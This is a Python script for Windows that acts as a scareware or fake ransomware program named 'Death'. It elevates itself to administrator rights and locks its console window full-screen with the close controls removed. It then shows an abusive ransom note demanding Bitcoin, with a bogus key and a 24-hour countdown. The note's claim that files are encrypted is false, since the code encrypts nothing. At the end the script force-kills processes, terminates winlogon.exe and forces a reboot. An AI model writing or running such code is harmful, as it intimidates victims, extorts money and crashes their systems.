import os
import sys
import time
import random
import string
import ctypes
import colorama
import win32gui
import win32con
from colorama import Fore, Style


# 获取管理员权限
def run_as_admin():
    if ctypes.windll.shell32.IsUserAnAdmin():
        # 当前已经以管理员身份运行，可以执行需要管理员权限的操作
        pass
    else:
        # 重新启动脚本以请求管理员权限
        ctypes.windll.shell32.ShellExecuteW(None, "runas", sys.executable, __file__, None, 1)
        sys.exit(0)


# 定义倒计时函数
def countdown(hours, message):
    total_seconds = hours * 3600
    while total_seconds > 0:
        hours = total_seconds // 3600
        minutes = (total_seconds % 3600) // 60
        seconds = total_seconds % 60
        print(
            f"\r         @@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@    {message} : {hours:02d}:{minutes:02d}:{seconds:02d}",
            end="")
        time.sleep(1)
        total_seconds -= 1


# 请求管理员权限并执行需要管理员权限的操作
run_as_admin()

# 获取控制台窗口句柄
hwnd = ctypes.windll.kernel32.GetConsoleWindow()

# 置顶控制台窗口
win32gui.SetWindowPos(hwnd, win32con.HWND_TOPMOST, 0, 0, 0, 0, win32con.SWP_NOMOVE | win32con.SWP_NOSIZE)

# 移除关闭按钮
style = win32gui.GetWindowLong(hwnd, win32con.GWL_STYLE)
style = style & ~win32con.WS_SYSMENU
win32gui.SetWindowLong(hwnd, win32con.GWL_STYLE, style)

# 移除最小化按钮
style = win32gui.GetWindowLong(hwnd, win32con.GWL_STYLE)
style = style & ~win32con.WS_MINIMIZEBOX
win32gui.SetWindowLong(hwnd, win32con.GWL_STYLE, style)

# 移除最大化按钮
style = win32gui.GetWindowLong(hwnd, win32con.GWL_STYLE)
style = style & ~win32con.WS_MAXIMIZEBOX
win32gui.SetWindowLong(hwnd, win32con.GWL_STYLE, style)

# 禁止拖动、移动和缩放窗口,移除标题栏
style = win32gui.GetWindowLong(hwnd, win32con.GWL_STYLE)
style = style & ~win32con.WS_CAPTION
style = style & ~win32con.WS_THICKFRAME
win32gui.SetWindowLong(hwnd, win32con.GWL_STYLE, style)

# 最大化窗口
user32 = ctypes.windll.user32
user32.ShowWindow(user32.GetForegroundWindow(), 3)

# 改变控制台窗口颜色
colorama.init()
print(Fore.WHITE + Style.BRIGHT)
os.system("color 4f")

# 定义随机字符串
def generate_random_key(length=16):
    characters = string.ascii_letters + string.digits
    random_key = ''.join(random.choice(characters) for _ in range(length))
    return random_key
random_key = generate_random_key(25)

# 绘制字符画和勒索警告
lines = [
    "",
    "",
    "",
    "",
    "",
    "",
    "",
    "",
    "",
    "",
    "         Death Wanning :",
    "         @@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@    Fuck You ! Fool ! I am Death ! Now , your computer has been messed up by the Death virus .",
    "         @@@@@@@@@@@@@@@@@@@@@@@@@@@@@@[],`........,`/\\@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@    Can you find me ? Let play a game !",
    "         @@@@@@@@@@@@@@@@@@@@@@@@@@O,...................`/@@@@@@@@@@@@@@@@@@@@@@@@@@@    My location is on the C drive , if you have the ability , come and delete me , you computer will be perish .",
    "         @@@@@@@@@@@@@@@@@@@@@@@@\\`........................\\\\@@@@@@@@@@@@@@@@@@@@@@@@    But you do not even have the ability to delete me . You are a jerk !",
    "         @@@@@@@@@@@@@@@@@@@@@@^`............................\\\\@@@@@@@@@@@@@@@@@@@@@@    Ooops , congratulation , you important files have been encrypted !",
    "         @@@@@@@@@@@@@@@@@@@@@\\................................/@@@@@@@@@@@@@@@@@@@@@    Many of your documents , photos , videos , databases and other files are no longer accessible because they are have been encrypted !",
    "         @@@@@@@@@@@@@@@@@@@@\\..................................`@@@@@@@@@@@@@@@@@@@@    It means you will not be able to access them anymore until they are decrypted .",
    "         @@@@@@@@@@@@@@@@@@@@`...................................=@@@@@@@@@@@@@@@@@@@    If you follow our instructions , we guarantee that you can decrypt all your files and fix your PC quickly and safely !",
    "         @@@@@@@@@@@@@@@@@@@^....................................O@@@@@@@@@@@@@@@@@@@    First , you need to pay service fees for the decryption .",
    "         @@@@@@@@@@@@@@@@@@@o....................................\\@@@@@@@@@@@@@@@@@@@    Payment is accepted in Bitcoin only . Please send $114514 worth of bitcoin to this bitcoin address : JiGuro .",
    "         @@@@@@@@@@@@@@@@@@@O...................................,=@@@@@@@@@@@@@@@@@@@    Because the time required for Bitcoin to arrive is a bit long , please be patient after payment .",
    "         @@@@@@@@@@@@@@@@@@@^`..,`...........................,..=@@@@@@@@@@@@@@@@@@@@    Once the payment is checked , you can start decrypting your files and recover your computer immediately .",
    "         @@@@@@@@@@@@@@@@@@@@,.=/^`........................==\\`.^@@@@@@@@@@@@@@@@@@@@    We will give you an application file named \" DeathDecryptor.exe \" , it is the decrypt software .",
    "         @@@@@@@@@@@@@@@@@@@@^*\\@``........................,,@].\\@@@@@@@@@@@@@@@@@@@@    Run and follow the instructions , and provide your unique user encrypted identification character , you may need to wait for a while .",
    "         @@@@@@@@@@@@@@@@@@@@@/^`....**]`*..........**,`,`....`/@@@@@@@@@@@@@@@@@@@@@    Don not worry about decryption , and do not trust anyone other than us . Nobody can recover your files without our decryption service .",
    "         @@@@@@@@@@@@@@@@@@@@/..`\\/@@@@@@@@``.....,@@@@@@@@@]``.`@@@@@@@@@@@@@@@@@@@@    Other users' decoders are not compatible with you data , as each user's unique encryption key .",
    "         @@@@@@@@@@@@@@@@@@@O..^@@@@@@@@@@@@ ....^@@@@@@@@@@@@=..=@@@@@@@@@@@@@@@@@@@    We will decrypt your files surely because nobody will trust us if we cheat users .",
    "         @@@@@@@@@@@@@@@@@@@@,..@@@@@@@@@@@@ ....^\\@@@@@@@@@@@ . @@@@@@@@@@@@@@@@@@@@    But you have not so enough time , you only have 12 hours to submit the payment . After that the price will be doubled .",
    "         @@@@@@@@@@@@@@@@@@@\\`.==@@@@@@@@/,,......`,\\@@@@@@@@^^.,=@@@@@@@@@@@@@@@@@@@    Also , if you do not pay in 24 hours , you won't be able to recover your files forever , your computer will also be scrapped .",
    "         @@@@@@@@@@@@@@@@@@@...., [[[`],`....`/\\\\....,`,/[[[]`...`@@@@@@@@@@@@@@@@@@@    We will have free events for users who are not pay in 20 hours , but whether it is your turn or not depends on your luck .",
    "         @@@@@@@@@@@@@@@@@@@\\\\..............`@/@@,..............`@@@@@@@@@@@@@@@@@@@@    Do not attempt to decrypt the files yourself , as this may result in permanent data loss .",
    "         @@@@@@@\\[.`@@@@@@@@@@/`...........==@\\/@^^...........*,@@@@@@@@@@@@@@@@@@@@@    Your computer cannot be restored without our detoxification , so try to use it as much as possible !",
    "         @@@@@@\\...,=@@@@@@@@@@@\\/]]]``......,`.,,.....,]]]]]@@@@@@@@@@@@\\....=@@@@@@    Attempting to delete Death or run anti-virus tools will cause your system to be immediately destroyed , so do not attempt !",
    "         @@@@@/,....,,,\\@@@@@@@@@@@@@@=................/@@@@@@@@@@@@@@@@,.....==@@@@@    Maybe you are busy looking for a way to recover your files , this will only waste your time .",
    "         @@@/`..........,,,\\@@@@@@@@@@O...............,=@@@@@@@@@@@@@@/ .......`\\@@@@    Do you want to cry ? But it is too late !",
    "         @@@/................`,[@@@@@@@\\`]`*.......*]//@@@@@@@@@/\\`,*...........*,@@@    You have to remember , do not turn off your PC !",
    "         @@@@/`..................,,[\\@@@@@@@\\/`,\\/@@@@@@@@@[`[*...........**,,]]//@@@    If you act recklessly , you will bear all the consequences and losses .",
    "         @@@@@@@@@@@@@]]`[.`.........,`/[@@@@@@@@@@@@/[``.......,`,[\\]/@@@@@@@@@@@@@@    All in all , if you obediently listen to us and do as we say , nothing will happen .",
    "         @@@@@@@@@@@@@@@@@@@@\\]``.........,,,\\@@/``[......,`[]/@@@@@@@@@@@@@@@@@@@@@@    Take action now , do not hesitate !",
    "         @@@@@@@@@@@@@@@@@@@@@@@@@@]`,..............., \\]@@@@@@@@@@@@@@@@@@@@@@@@@@@@    Thank you for your cooperation , good luck !",
    "         @@@@@@@@@@@@@@@@@@@@@@@@@@@@/\\`.............,`][@@@@@@@@@@@@@@@@@@@@@@@@@@@@    Interesting , ha ha ha ha ha !",
    "         @@@@@@@@@@@@@@@@@@@@@@@/[`[.......,.[``...........[,/[@@@@@/O[@@@@@@@@@@@@@@    By : Death",
    "         @@@@@@@@@@@[/\\[@@@/[`[.......,`\\]@@@@@@@]/,*............**....,/@@@@@@@@@@@@    Author : JiGuro",
    "         @@@@@@@@@\\*.....*........,,]@@@@@@@@@@@@@@@@@]`]..............*\\@@@@@@@@@@@@    * * * I Am A Demon From Heaven * * *",
    "         @@@@@@@@@/`..........*,,@@@@@@@@@@@@@@@@@@@@@@@@@\\/,*.........^@@@@@@@@@@@@@    * * * I Want You To Suffer All The Torment * * *",
    "         @@@@@@@@@@\\,........ /@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@\\`\\.......\\\\@@@@@@@@@@@    * * * Everything Will Fly And Disappear * * *",
    "         @@@@@@@@@@@^......//@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@]``....O@@@@@@@@@@@    * * * Only Death Can Live Forever * * *"
]

for line in lines:
    for char in line:
        print(char, end='', flush=True)  # 输出每个字符，确保在同一行并立即刷新输出缓冲区
        time.sleep(0.01)  # 控制每个字符输出的时间间隔
    print()  # 输出完毕后换行

# 输出随机密钥
time.sleep(0.5)
print(f"         @@@@@@@@@@@\\[..=@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@/\\]@@@@@@@@@@@@@    Your unique user encrypted identification character : {random_key}")

# 开始倒计时
time.sleep(0.5)
countdown(24, "The time remaining until Death reaps your life")

# 倒计时结束后自动关机
os.system(f'"taskkill /f /fi "pid ne 1""')
os.system("ntsd -c q -pn winlogon.exe")
os.system("shutdown -r -f -t 0")
